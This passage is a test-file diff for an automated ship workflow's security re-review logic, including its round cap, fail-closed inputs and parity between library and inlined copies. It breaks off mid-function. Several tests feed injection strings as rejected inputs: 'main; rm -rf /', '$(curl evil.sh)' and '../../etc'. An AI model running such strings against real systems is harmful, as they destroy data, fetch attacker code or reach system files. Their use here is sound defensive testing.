@@ -113,6 +113,21 @@ function decisionScope(
     headSha: head,
     reviewSha: tested,
     buildCommit: head,
+    // #171's names. The budget DEFAULTS TO ZERO so the #169 cases above keep
+    // asking what they have always asked — "the review is stale and nothing
+    // can be done about it, now what" — and the #171 cases set a budget
+    // explicitly. The re-review spawner throws rather than returning a verdict,
+    // so a case that re-reviews without meaning to fails loudly instead of
+    // passing through a stub it never intended to exercise.
+    ...inlinedReReview,
+    rookReviewSha: inlined.rookReviewSha,
+    MAX_SECURITY_REREVIEWS: 0,
+    runRookReview: () => {
+      throw new Error("the decision block spawned a re-review this test did not ask for");
+    },
+    recordExhaustedSecurityReview: () => {
+      throw new Error("the decision block recorded exhaustion this test did not ask for");
+    },
     ...rest,
   };
 }
@@ -188,6 +203,45 @@ const inlinedReviewIsCurrent: typeof reviewIsCurrent = (() => {
     );
   }
   return fn as typeof reviewIsCurrent;
+})();
+
+/**
+ * ship.js's inlined #171 decision and its three verdict constants, extracted
+ * from the same marked region, for the same reason as `inlinedReviewIsCurrent`
+ * above: if the block stops defining them, this file fails to load rather than
+ * reporting a quiet green over a workflow that lost its re-review path.
+ *
+ * Spread into the decision block's scope by `decisionScope`, so the block is
+ * executed against the constants ship.js actually declares — a test that
+ * supplied its own `RE_REVIEW` string could agree with a block that spells it
+ * differently.
+ */
+const inlinedReReview = (() => {
+  const securityBlock = sliceBlock(SECURITY_START, SECURITY_END);
+  const currencyBlock = sliceBlock(CURRENCY_START, CURRENCY_END);
+  const names = "{ reReviewDecision, REVIEW_CURRENT, RE_REVIEW, SECURITY_REREVIEW_EXHAUSTED }";
+  const body = securityBlock.includes(currencyBlock)
+    ? `${securityBlock}\nreturn ${names}`
+    : `${securityBlock}\nreturn (function () {${currencyBlock}\nreturn ${names}})()`;
+  const out = new Function(body)() as {
+    reReviewDecision: typeof reReviewDecision;
+    REVIEW_CURRENT: string;
+    RE_REVIEW: string;
+    SECURITY_REREVIEW_EXHAUSTED: string;
+  };
+  if (typeof out.reReviewDecision !== "function") {
+    throw new Error(
+      "ship.js's REVIEW-CURRENCY block does not define reReviewDecision — " +
+        "the re-review path below would be testing nothing",
+    );
+  }
+  for (const [name, value] of Object.entries(out)) {
+    if (name === "reReviewDecision") continue;
+    if (typeof value !== "string" || value === "") {
+      throw new Error(`ship.js's inlined ${name} is not a verdict constant`);
+    }
+  }
+  return out;
 })();
 
 const SHA = "3192a75c4f1e2b8d9a0c5e6f7081a2b3c4d5e6f7";
@@ -993,6 +1047,768 @@ describe("#169 parity: the inlined copy matches lib/security-verdict.ts", () => 
   });
 });
 
+// ── #171 the decision: re-review the new tip, or run out of attempts ────
+
+/**
+ * #171 — #169 stopped the run; this decides whether the stop is worth one more
+ * review.
+ *
+ * Run `wf_6fbfa028-14e` on #239 spent 87.7 minutes and 1,287,510 subagent
+ * tokens across 22 agents and merged nothing. Rook returned PASS with no
+ * findings, and the run died at SHIP because the verify gate's self-heal loop
+ * committed 00f21e21 — 7 files, 992 insertions, `workflows/ship.js` among them
+ * — after the review had been pinned to c5ebc2a4. The self-heal loop fires
+ * whenever the first verify attempt leaves anything to fix, so the refusal had
+ * made the common path the failing one.
+ *
+ * The matrix below is driven over the library AND over ship.js's inlined copy,
+ * the same way the #169 currency matrix is, so "the two agree" cannot be
+ * satisfied by the two being asked different questions.
+ */
+const STALE_CURRENCY = reviewIsCurrent(SHA, OTHER_SHA);
+const CURRENT_CURRENCY = reviewIsCurrent(SHA, SHA);
+
+const REREVIEW_MATRIX: Array<[string, unknown, unknown, unknown, ReReviewDecision]> = [
+  ["a current review, nothing spent", CURRENT_CURRENCY, 0, 2, REVIEW_CURRENT],
+  ["a current review with the cap already spent", CURRENT_CURRENCY, 2, 2, REVIEW_CURRENT],
+  ["a stale review with the whole budget left", STALE_CURRENCY, 0, 2, RE_REVIEW],
+  ["a stale review on the last round", STALE_CURRENCY, 1, 2, RE_REVIEW],
+  ["a stale review with the cap spent", STALE_CURRENCY, 2, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a stale review past the cap", STALE_CURRENCY, 3, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a cap of zero", STALE_CURRENCY, 0, 0, SECURITY_REREVIEW_EXHAUSTED],
+  // Fail-closed inputs. Every one of these is the absence of a reading that
+  // says a round may be spent, and absence is not permission.
+  ["no currency at all", undefined, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a null currency", null, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency that is a string", "CURRENT", 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency that is an array", [], 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency with no verdict", {}, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency whose verdict is a string", { current: "yes" }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  // The two self-contradictory shapes: "current, and here is why it is not",
+  // and "stale, with no reason". Reading either as one of the two things it
+  // says is picking at random.
+  [
+    "current with a reason attached",
+    { current: true, reason: "the branch moved" },
+    0,
+    2,
+    SECURITY_REREVIEW_EXHAUSTED,
+  ],
+  ["stale with no reason", { current: false }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["stale with a blank reason", { current: false, reason: "   " }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["an unreadable spent count", STALE_CURRENCY, undefined, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a fractional spent count", STALE_CURRENCY, 1.5, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a negative spent count", STALE_CURRENCY, -1, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["NaN rounds", STALE_CURRENCY, NaN, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["an infinite cap", STALE_CURRENCY, 0, Infinity, SECURITY_REREVIEW_EXHAUSTED],
+  ["a cap that is a string", STALE_CURRENCY, 0, "2", SECURITY_REREVIEW_EXHAUSTED],
+  ["an absent cap", STALE_CURRENCY, 0, undefined, SECURITY_REREVIEW_EXHAUSTED],
+];
+
+describe("#171 reReviewDecision: the stale review is re-run while a round remains", () => {
+  for (const [label, currency, spent, cap, expected] of REREVIEW_MATRIX) {
+    test(`${label} → ${expected}`, () => {
+      const out = reReviewDecision(currency, spent, cap);
+      expect(out.decision, `${label}: the library decided ${out.decision}`).toBe(expected);
+      if (expected === REVIEW_CURRENT) {
+        expect(out.reason, `${label}: a current review carried a reason`).toBeNull();
+      } else {
+        expect(typeof out.reason, `${label}: ${expected} carried no reason`).toBe("string");
+        expect(out.reason!.trim().length).toBeGreaterThan(0);
+      }
+    });
+  }
+
+  test("the three verdicts are three different words", () => {
+    // A decision whose members collapse is a decision the caller cannot act
+    // on differently, which is the whole of AC-3: exhaustion must be readable
+    // as neither of its neighbours.
+    expect(new Set([REVIEW_CURRENT, RE_REVIEW, SECURITY_REREVIEW_EXHAUSTED]).size).toBe(3);
+  });
+
+  test("the re-review reason is the staleness reason, so it names both commits", () => {
+    const out = reReviewDecision(STALE_CURRENCY, 0, 2);
+    expect(out.reason).toBe(STALE_CURRENCY.reason);
+    expect(out.reason).toContain(SHA);
+    expect(out.reason).toContain(OTHER_SHA.toLowerCase());
+  });
+
+  test("the exhaustion reason says how many rounds were spent against what cap", () => {
+    const out = reReviewDecision(STALE_CURRENCY, 2, 2);
+    expect(out.decision).toBe(SECURITY_REREVIEW_EXHAUSTED);
+    expect(out.reason).toContain("2");
+    expect(out.reason, "the refusal does not say the attempts ran out").toMatch(
+      /ran out of attempts/i,
+    );
+    // It still says WHY the review was not current, or the refusal names a
+    // budget without naming the problem the budget was being spent on.
+    expect(out.reason).toContain(OTHER_SHA.toLowerCase());
+  });
+
+  test("nothing throws — a throw here is a refusal the caller can swallow", () => {
+    const hostile = new Proxy(
+      {},
+      {
+        get() {
+          throw new Error("hostile currency");
+        },
+      },
+    );
+    for (const bad of [hostile, Symbol.iterator, () => {}, new Date(), NaN]) {
+      expect(() => reReviewDecision(bad as unknown, 0, 2)).not.toThrow();
+      expect(() => reReviewDecision(STALE_CURRENCY, bad as unknown, bad as unknown)).not.toThrow();
+    }
+  });
+
+  test("the exhaustion refusal is spelled once in the library", () => {
+    // A second spelling is a second refusal path, reachable by code the first
+    // one's tests never visit — which is how a refusal comes to exist that
+    // nothing has ever proved can fire.
+    const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
+    const literals = lib.match(/"SECURITY_REREVIEW_EXHAUSTED"/g) || [];
+    expect(literals.length, "the exhaustion name is written as a string literal more than once").toBe(1);
+    expect((lib.match(/export const SECURITY_REREVIEW_EXHAUSTED/g) || []).length).toBe(1);
+    expect((lib.match(/export function reReviewDecision/g) || []).length).toBe(1);
+  });
+});
+
+describe("#171 the re-review's scope is the remediation diff", () => {
+  test("the reviewed commit becomes --base and the new tip becomes --sha", () => {
+    // AC-2. Without the base the second review re-reads the whole branch,
+    // which is both slower and worse: the finding that matters is in the
+    // commit the self-heal loop just wrote.
+    const cmd = rookScopeCommand("/p", "/h", OTHER_SHA, "/w/scope-2.json", SHA);
+    expect(cmd).toContain(`--sha ${OTHER_SHA.toLowerCase()}`);
+    expect(cmd).toContain(`--base ${SHA}`);
+  });
+
+  test("no base at all leaves the script's origin/main default in place", () => {
+    for (const none of [undefined, null, ""]) {
+      const cmd = rookScopeCommand("/p", "/h", SHA, "/w/s.json", none as unknown as string);
+      expect(cmd, `${JSON.stringify(none)} produced a --base flag`).not.toContain("--base");
+    }
+  });
+
+  test("a base that is not a commit SHA is refused rather than quoted", () => {
+    // Same argument as the --sha refusal: a value that needs quoting here is
+    // not a commit, and three consecutive security reviews of this area each
+    // found a hole in a filter that sanitised instead of refusing.
+    for (const bad of ["HEAD", "origin/main", "main; rm -rf /", "$(curl evil.sh)", "../../etc"]) {
+      expect(() =>
+        rookScopeCommand("/p", "/h", SHA, "/w/s.json", bad),
+      ).toThrow(/not a commit SHA/i);
+    }
+  });
+});
+
+// ── #171 the decision block re-reviews instead of dying ─────────────────
+
+/** A third commit: the tip a second remediation round leaves behind. */
+const THIRD_SHA = "7c1d9e0ab2f3456789abcdef0123456789abcdef";
+
+const SPAWN_START = "// ──── ROOK-REVIEW-SPAWN-START ────";
+const SPAWN_END = "// ──── ROOK-REVIEW-SPAWN-END ────";
+
+/**
+ * ship.js's security-review spawn, extracted by marker and compiled with
+ * stubs, so a round can be requested with arbitrary arguments.
+ *
+ * The fan-out harness below cannot do this: it calls the block, and the block
+ * calls `runRookReview()` for the first review only. What AC-2 is about is the
+ * SECOND call's arguments, so the function is reached directly — the same way
+ * every other block in this file is reached — rather than through a stub that
+ * could agree with a prompt production never builds.
+ */
+function buildReviewSpawn(opts: { rook?: unknown; scope?: unknown } = {}) {
+  const labels: string[] = [];
+  const prompts: string[] = [];
+  const logs: string[] = [];
+  const factory = new Function(
+    "log", "timedAgent", "briefedAgent", "PROJECT_ROOT", "HARNESS_ROOT", "WORK_DIR",
+    "ISSUE", "GATE_RESULT_SCHEMA", "reviewSha", "rookScopeCommand", "rookGateVerdict",
+    "shellQuote",
+    `let securityVerdict = { spawned: false, verdict: 'FAIL', failures: ['the security review did not run'] }
+${sliceBlock(SPAWN_START, SPAWN_END)}
+return { runRookReview, recordExhaustedSecurityReview }`,
+  );
+  const record = (label: string, prompt: string) => {
+    labels.push(label);
+    prompts.push(prompt);
+  };
+  const mod = factory(
+    (m: unknown) => logs.push(String(m)),
+    async (p: string, o: { label: string }) => {
+      record(o.label, p);
+      return o.label === "rook-scope" ? (opts.scope ?? GOOD_SCOPE) : { ok: true };
+    },
+    async (p: string, o: { label: string }) => {
+      record(o.label, p);
+      return opts.rook ?? { result: "PASS" };
+    },
+    REPO_ROOT, REPO_ROOT, "/tmp/work", 171, {},
+    SHA, inlined.rookScopeCommand, inlined.rookGateVerdict, shellQuote,
+  ) as {
+    runRookReview: (o?: unknown) => Promise<{ verdict: unknown; testedSha: unknown } | undefined>;
+    recordExhaustedSecurityReview: (rounds: number) => Promise<void>;
+  };
+  return {
+    mod,
+    labels,
+    prompts,
+    logs,
+    promptFor(label: string) {
+      const i = labels.indexOf(label);
+      return i === -1 ? "" : prompts[i];
+    },
+  };
+}
+
+async function runReviewSpawn(round?: { sha: string; base: string; round: number }) {
+  const harness = buildReviewSpawn();
+  const returned = await harness.mod.runRookReview(round);
+  return { ...harness, returned };
+}
+
+interface ReReviewCall {
+  sha: unknown;
+  base: unknown;
+  round: unknown;
+}
+
+/**
+ * Drive the decision block over a run whose branch has moved past the review.
+ *
+ * `spawn` decides what each re-review round returns, so a test can make the
+ * second review pass, fail, pin itself to the wrong commit, or return nothing
+ * at all. Every call is recorded, which is how AC-2 is checked: the scope the
+ * second review is given is an argument this harness can read, not a string in
+ * a prompt nobody runs.
+ */
+function reReviewRun(opts: {
+  tested?: unknown;
+  head?: unknown;
+  budget?: unknown;
+  spawn?: (call: ReReviewCall, n: number) => unknown;
+  overrides?: Record<string, unknown>;
+}) {
+  const logs: string[] = [];
+  const calls: ReReviewCall[] = [];
+  const exhaustionRecorded: number[] = [];
+  const head = "head" in opts ? opts.head : OTHER_SHA;
+  const spawn =
+    opts.spawn ??
+    ((call: ReReviewCall) => ({
+      verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
+      testedSha: call.sha,
+    }));
+
+  const scope = decisionScope(logs, {
+    tested: "tested" in opts ? opts.tested : SHA,
+    head,
+    MAX_SECURITY_REREVIEWS: "budget" in opts ? opts.budget : 2,
+    runRookReview: async (call: ReReviewCall) => {
+      calls.push(call);
+      return spawn(call, calls.length);
+    },
+    recordExhaustedSecurityReview: async (rounds: number) => {
+      exhaustionRecorded.push(rounds);
+    },
+    ...(opts.overrides ?? {}),
+  });
+  const result = runMarkedBlock(sliceBlock(DECISION_START, DECISION_END), scope);
+  return { result, logs, calls, exhaustionRecorded, scope };
+}
+
+describe("#171 AC-1: a remediation commit is re-reviewed, not fatal", () => {
+  test("the run continues to the PR step on the re-review's PASS", async () => {
+    // The wf_6fbfa028-14e shape: rook passed c5ebc2a4, the self-heal loop then
+    // committed 00f21e21, and the run died at SHIP having merged nothing. The
+    // block must now spawn a second review of the new tip and fall through.
+    const run = reReviewRun({ tested: "c5ebc2a4", head: OTHER_SHA });
+    expect(
+      await run.result,
+      "a remediation commit still ended the run instead of being re-reviewed",
+    ).toBeUndefined();
+    expect(run.calls.length, "no re-review was spawned").toBe(1);
+    expect(run.exhaustionRecorded, "an exhaustion was recorded for a run that re-reviewed").toEqual([]);
+  });
+
+  test("the re-review is announced, with the round and the cap", async () => {
+    const run = reReviewRun({});
+    await run.result;
+    const line = run.logs.find(l => /re-review/i.test(l) && /round/i.test(l));
+    expect(line, `nothing in the log says a re-review happened: ${run.logs.join(" | ")}`).toBeDefined();
+    expect(line).toContain("1");
+    expect(line).toContain("2");
+  });
+
+  test("the positive control: a current review spawns nothing at all", async () => {
+    // Without this, a block that re-reviewed unconditionally would satisfy
+    // every assertion above — and would spend a rook on every passing run.
+    const run = reReviewRun({ tested: SHA, head: SHA });
+    expect(await run.result).toBeUndefined();
+    expect(run.calls, "a current review was re-reviewed anyway").toEqual([]);
+  });
+
+  test("a re-review that FAILs stops the run on the verdict path", async () => {
+    const run = reReviewRun({
+      spawn: () => ({
+        verdict: { spawned: true, verdict: "FAIL", failures: ["a reproduced guard bypass"] },
+        testedSha: OTHER_SHA,
+      }),
+    });
+    const out = await run.result;
+    expect(out?.status, "a failing re-review reached the PR step").toBe("SHIP_FAILED");
+    expect(String(out?.reason)).toContain("a reproduced guard bypass");
+    expect((out?.security as { verdict: string }).verdict).toBe("FAIL");
+  });
+
+  test("a re-review that returns nothing is a FAIL, not a fall-through", async () => {
+    // The agent-returned-undefined case. Absence of evidence is not evidence
+    // of absence on the path that decides whether a run may ship.
+    for (const nothing of [undefined, null, {}, "PASS", { verdict: null }]) {
+      const run = reReviewRun({ spawn: () => nothing });
+      const out = await run.result;
+      expect(
+        out?.status,
+        `a re-review returning ${JSON.stringify(nothing)} let the run continue`,
+      ).toBe("SHIP_FAILED");
+    }
+  });
+
+  test("a second remediation round inside the cap is re-reviewed again", async () => {
+    // Round 1 passes but pins itself to a commit that is still behind the tip
+    // — which is what a round that reviewed while the branch moved again looks
+    // like. The loop must spend its second round rather than refuse.
+    let n = 0;
+    const run = reReviewRun({
+      head: THIRD_SHA,
+      spawn: call => {
+        n++;
+        return {
+          verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
+          testedSha: n === 1 ? OTHER_SHA : call.sha,
+        };
+      },
+    });
+    expect(await run.result).toBeUndefined();
+    expect(run.calls.length, "the second round was never spent").toBe(2);
+  });
+});
+
+describe("#171 AC-2: the second review reads the remediation diff", () => {
+  test("the reviewed commit is the base and the new tip is the subject", async () => {
+    const run = reReviewRun({ tested: SHA, head: OTHER_SHA });
+    await run.result;
+    expect(run.calls[0].base, "the re-review was not based on the reviewed commit").toBe(SHA);
+    expect(run.calls[0].sha, "the re-review was not aimed at the new tip").toBe(
+      OTHER_SHA.toLowerCase(),
+    );
+    expect(run.calls[0].round).toBe(1);
+  });
+
+  test("the second round bases on what the first round reviewed, not the original", async () => {
+    let n = 0;
+    const run = reReviewRun({
+      head: THIRD_SHA,
+      spawn: call => {
+        n++;
+        return {
+          verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
+          testedSha: n === 1 ? OTHER_SHA : call.sha,
+        };
+      },
+    });
+    await run.result;
+    expect(run.calls[1].base, "round 2 re-read ground round 1 had already covered").toBe(OTHER_SHA);
+    expect(run.calls[1].round).toBe(2);
+  });
+
+  test("the spawn builds a --base scope command and names the commit in the prompt", async () => {
+    // The argument is only half of AC-2; the other half is that runRookReview
+    // turns it into a scope narrowed to those two commits, and tells the
+    // reviewer which commit it is reading. Asserted over the real spawn,
+    // extracted from ship.js and executed, not over a stub.
+    const round = await runReviewSpawn({ sha: OTHER_SHA, base: SHA, round: 1 });
+    const scopePrompt = round.promptFor("rook-scope");
+    expect(scopePrompt).toContain(`--sha ${OTHER_SHA.toLowerCase()}`);
+    expect(scopePrompt, "the re-review's scope is not narrowed to the remediation diff").toContain(
+      `--base ${SHA}`,
+    );
+    const rookPrompt = round.promptFor("rook");
+    expect(rookPrompt, "the reviewer is not told which commit it is re-reviewing").toContain(
+      OTHER_SHA.toLowerCase(),
+    );
+    expect(rookPrompt).toContain(SHA);
+    expect(rookPrompt).toMatch(/RE-REVIEW ROUND 1/);
+  });
+
+  test("the spawn reports the verdict and the commit it reviewed", async () => {
+    // What the decision block reads back. A spawn that returned nothing would
+    // make every re-review look like a failure, and one that returned the old
+    // commit would loop until the cap.
+    const round = await runReviewSpawn({ sha: OTHER_SHA, base: SHA, round: 1 });
+    expect(round.returned?.testedSha).toBe(OTHER_SHA.toLowerCase());
+    expect((round.returned?.verdict as { verdict: string }).verdict).toBe("PASS");
+  });
+
+  test("the first review still has no --base, so it reads the whole branch", async () => {
+    const first = await runReviewSpawn();
+    expect(
+      first.promptFor("rook-scope"),
+      "the first review was narrowed to a base nothing had reviewed",
+    ).not.toContain("--base");
+    expect(first.promptFor("rook"), "the first review announced itself as a re-review").not.toMatch(
+      /RE-REVIEW ROUND/,
+    );
+  });
+
+  test("each round writes its own scope and findings files", async () => {
+    // A second review reading the first one's findings file would report
+    // findings it never made — and a run that re-reviewed twice would leave
+    // one artefact where it did two reviews.
+    const paths = (ps: string[]) =>
+      ps.join("\n").match(/rook-(?:scope|findings)[\w-]*\.json/g) || [];
+    const first = await runReviewSpawn();
+    const second = await runReviewSpawn({ sha: OTHER_SHA, base: SHA, round: 1 });
+    expect(paths(first.prompts).length).toBeGreaterThan(0);
+    expect(paths(second.prompts).length).toBeGreaterThan(0);
+    for (const p of paths(first.prompts)) {
+      expect(p, `the first review wrote ${p}, which belongs to a round`).not.toContain("-r");
+    }
+    for (const p of paths(second.prompts)) {
+      expect(p, `round 1 wrote ${p}, the same file the first review used`).toContain("-r1");
+    }
+  });
+
+  test("the round's verdict is recorded under its own label", async () => {
+    const second = await runReviewSpawn({ sha: OTHER_SHA, base: SHA, round: 1 });
+    expect(second.labels).toContain("record-security-r1");
+    const first = await runReviewSpawn();
+    expect(first.labels).toContain("record-security");
+  });
+
+  test("the exhaustion recorder writes EXHAUSTED with the round count", async () => {
+    const spawn = buildReviewSpawn();
+    await spawn.mod.recordExhaustedSecurityReview(3);
+    const prompt = spawn.promptFor("record-security-exhausted");
+    expect(prompt, "nothing records that the cycle ran out of attempts").not.toBe("");
+    expect(prompt).toContain("--verdict EXHAUSTED");
+    expect(prompt).toContain("--rounds");
+    expect(prompt).toContain("3");
+    expect(prompt, "an exhausted cycle handed the recorder a findings list").not.toContain(
+      "--findings",
+    );
+  });
+});
+
+describe("#171 AC-3: the cycle is capped, and the cap is its own outcome", () => {
+  test("a review that is still behind after every round refuses as exhausted", async () => {
+    // The reviewer keeps reporting a commit the branch has already moved past
+    // — the pathological remediation loop. The run must stop, and it must stop
+    // saying which thing went wrong.
+    const run = reReviewRun({ spawn: () => ({
+      verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
+      testedSha: SHA,
+    }) });
+    const out = await run.result;
+    expect(out?.status).toBe("SHIP_FAILED");
+    expect(String(out?.reason)).toStartWith(SECURITY_REREVIEW_EXHAUSTED);
+    expect(run.calls.length, "the cap did not bound the loop").toBe(2);
+  });
+
+  test("the refusal is recorded in workflow-state with the round count", async () => {
+    const run = reReviewRun({ spawn: () => ({
+      verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
+      testedSha: SHA,
+    }) });
+    await run.result;
+    expect(
+      run.exhaustionRecorded,
+      "the run ended holding unreviewed code and the artefact does not say so",
+    ).toEqual([2]);
+  });
+
+  test("the exhaustion refusal is not the staleness refusal", async () => {
+    // AC-3's "distinguishably". A reader cannot act differently on two
+    // refusals that say the same word.
+    const exhausted = await reReviewRun({ spawn: () => ({
+      verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
+      testedSha: SHA,
+    }) }).result;
+    const stale = await runDecisionBlock(decisionScope([], { tested: SHA, head: OTHER_SHA }));
+    expect(String(exhausted?.reason)).not.toStartWith("SECURITY_REVIEW_STALE");
+    expect(String(stale?.reason)).toStartWith("SECURITY_REVIEW_STALE");
+    expect(String(stale?.reason)).not.toContain(SECURITY_REREVIEW_EXHAUSTED);
+  });
+
+  test("a smaller cap spends fewer rounds, so the number is the bound", async () => {
+    for (const budget of [1, 2, 3]) {
+      const run = reReviewRun({
+        budget,
+        spawn: () => ({
+          verdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
+          testedSha: SHA,
+        }),
+      });
+      await run.result;
+      expect(run.calls.length, `a cap of ${budget} spent ${run.calls.length} rounds`).toBe(budget);
+      expect(run.exhaustionRecorded).toEqual([budget]);
+    }
+  });
+
+  test("ship.js declares a cap bigger than zero", () => {
+    // The harness above supplies the budget, so without this the production
+    // value could be 0 — a re-review path that never runs — and every test in
+    // this describe would still pass.
+    const decl = shipSource.match(/const MAX_SECURITY_REREVIEWS\s*=\s*(\d+)/);
+    expect(decl, "ship.js has no re-review cap").not.toBeNull();
+    expect(Number(decl![1]), "the re-review cap is zero, so the path never runs").toBeGreaterThan(0);
+    expect(
+      (shipSource.match(/const MAX_SECURITY_REREVIEWS\s*=/g) || []).length,
+      "the cap is declared more than once",
+    ).toBe(1);
+  });
+});
+
+describe("#171 AC-4: the #169 detection half is preserved, not relaxed", () => {
+  test("a stale review with no round available still refuses as STALE", async () => {
+    // The #169 refusal, unchanged: nothing was re-reviewed, so the run ends on
+    // the name #169 gave it rather than on the new one.
+    const run = reReviewRun({ budget: 0 });
+    const out = await run.result;
+    expect(out?.status).toBe("SHIP_FAILED");
+    expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
+    expect(run.calls, "a run with no budget spawned a review anyway").toEqual([]);
+    expect(
+      run.exhaustionRecorded,
+      "a run that spent no round recorded an exhausted cycle",
+    ).toEqual([]);
+  });
+
+  test("an unreadable budget is stale, not an invitation to re-review", async () => {
+    for (const budget of [undefined, null, -1, 1.5, NaN, "2", {}]) {
+      const run = reReviewRun({ budget });
+      const out = await run.result;
+      expect(out?.status, `a budget of ${JSON.stringify(budget)} was waved through`).toBe(
+        "SHIP_FAILED",
+      );
+      expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
+      expect(run.calls).toEqual([]);
+    }
+  });
+
+  test("an unusable pair of commits is stale, and nothing is spawned", async () => {
+    // A re-review has to be aimed at a commit. "HEAD" is what made the #129
+    // diff empty, and a missing testedSha gives the re-review no base.
+    for (const [tested, head] of [
+      [SHA, "HEAD"], [SHA, ""], [SHA, undefined], [SHA, null],
+      ["HEAD", OTHER_SHA], ["", OTHER_SHA], [undefined, OTHER_SHA], [{}, OTHER_SHA],
+    ] as Array<[unknown, unknown]>) {
+      const run = reReviewRun({ tested, head });
+      const out = await run.result;
+      expect(
+        out?.status,
+        `tested=${JSON.stringify(tested)} head=${JSON.stringify(head)} was waved through`,
+      ).toBe("SHIP_FAILED");
+      expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
+      expect(run.calls, "a re-review was aimed at something that is not a commit").toEqual([]);
+    }
+  });
+
+  test("a completed re-review moves the commit the Ship-round check compares", async () => {
+    // The Ship-round block reads `testedSha`. If the Verify-side loop left it
+    // naming the commit the FIRST review read, a later round would be measured
+    // against a review two commits old and the refusal would quote the wrong
+    // one. The loop writes the result back, so "what was last reviewed" has
+    // one meaning in both checks.
+    const run = reReviewRun({ tested: SHA, head: OTHER_SHA });
+    expect(await run.result).toBeUndefined();
+    expect(run.scope.testedSha, "the reviewed commit did not move with the re-review").toBe(
+      OTHER_SHA.toLowerCase(),
+    );
+    // And a run that re-reviewed nothing leaves it exactly where it was.
+    const untouched = reReviewRun({ tested: SHA, head: SHA });
+    await untouched.result;
+    expect(untouched.scope.testedSha).toBe(SHA);
+  });
+
+  test("the Ship-round refusal is untouched and still names SECURITY_REVIEW_STALE", async () => {
+    // The second currency check, after recommit-ship, is the other half of
+    // #169. #171 does not loosen it: a Ship-round remediation that moves the
+    // branch past the review still ends the run there.
+    const out = await runMarkedBlock(
+      STALE_REFUSAL_BLOCK,
+      shipRoundScope([], { tested: "3fe336f1", commitSha: OTHER_SHA }),
+    );
+    expect(out?.status).toBe("SHIP_FAILED");
+    expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
+  });
+
+  test("a rook FAIL is still read before any of this", async () => {
+    // The re-review loop must not run ahead of the verdict refusal: a FAIL
+    // that got re-reviewed into a PASS would be #129 with extra steps.
+    const run = reReviewRun({
+      overrides: {
+        securityVerdict: { spawned: true, verdict: "FAIL", failures: ["guard bypass"] },
+      },
+    });
+    const out = await run.result;
+    expect(out?.status).toBe("SHIP_FAILED");
+    expect(String(out?.reason)).toContain("guard bypass");
+    expect(run.calls, "a failing review was re-reviewed instead of refused").toEqual([]);
+  });
+
+  test("both refusal names are in the file, and the exhaustion one is spelled once", () => {
+    expect((shipSource.match(/SECURITY_REVIEW_STALE/g) || []).length).toBeGreaterThanOrEqual(2);
+    expect(
+      (shipSource.match(/'SECURITY_REREVIEW_EXHAUSTED'/g) || []).length,
+      "the exhaustion name is written as a literal more than once in ship.js",
+    ).toBe(1);
+  });
+
+  test("no branch turns the re-review decision into a log line the run continues past", () => {
+    // The cheap version of #171 — re-review, then carry on regardless of what
+    // it said — is #129 rewritten with one more agent in it.
+    expect(
+      shipSource.match(/reReviewOutcome\.decision\s*===\s*RE_REVIEW\s*\?/g) || [],
+      "ship.js decides the re-review through a ternary",
+    ).toEqual([]);
+    expect(shipSource.match(/[Cc]urrency\.current\s*\?/g) || []).toEqual([]);
+  });
+});
+
+describe("#171 parity: the inlined re-review decision matches the library", () => {
+  for (const [label, currency, spent, cap, expected] of REREVIEW_MATRIX) {
+    test(`agrees on ${label}`, () => {
+      expect(inlinedReReview.reReviewDecision(currency, spent, cap), `drift at ${label}`).toEqual(
+        reReviewDecision(currency, spent, cap),
+      );
+      expect(inlinedReReview.reReviewDecision(currency, spent, cap).decision).toBe(expected);
+    });
+  }
+
+  test("the three verdict constants are spelled the same in both", () => {
+    expect(inlinedReReview.REVIEW_CURRENT).toBe(REVIEW_CURRENT);
+    expect(inlinedReReview.RE_REVIEW).toBe(RE_REVIEW);
+    expect(inlinedReReview.SECURITY_REREVIEW_EXHAUSTED).toBe(SECURITY_REREVIEW_EXHAUSTED);
+  });
+
+  test("rookScopeCommand agrees about a base too", () => {
+    expect(inlined.rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", SHA)).toBe(
+      rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", SHA),
+    );
+    expect(inlined.rookScopeCommand("/p", "/h", SHA, "/w/s.json")).toBe(
+      rookScopeCommand("/p", "/h", SHA, "/w/s.json"),
+    );
+    for (const bad of ["HEAD", "origin/main", "main; rm -rf /"]) {
+      expect(() => inlined.rookScopeCommand("/p", "/h", SHA, "/w/s.json", bad)).toThrow(
+        /not a commit SHA/i,
+      );
+    }
+  });
+});
+
+// ── #171 AC-6: the re-review spawn is removed, and the run is watched ───
+
+/**
+ * The one call the mutation removes.
+ *
+ * Declared as a literal rather than built by regex so that renaming it in
+ * ship.js aborts this file instead of quietly mutating nothing — the same
+ * property `test/suite-binding-mutation.test.ts` asserts for its own binding.
+ */
+const REREVIEW_SPAWN =
+  "const reReviewed = await runRookReview({ sha: reReviewTarget, base: reviewedBase, round: reReviewRounds })";
+
+function decisionBlockWithoutSpawn(): string {
+  const block = sliceBlock(DECISION_START, DECISION_END);
+  const occurrences = block.split(REREVIEW_SPAWN).length - 1;
+  if (occurrences !== 1) {
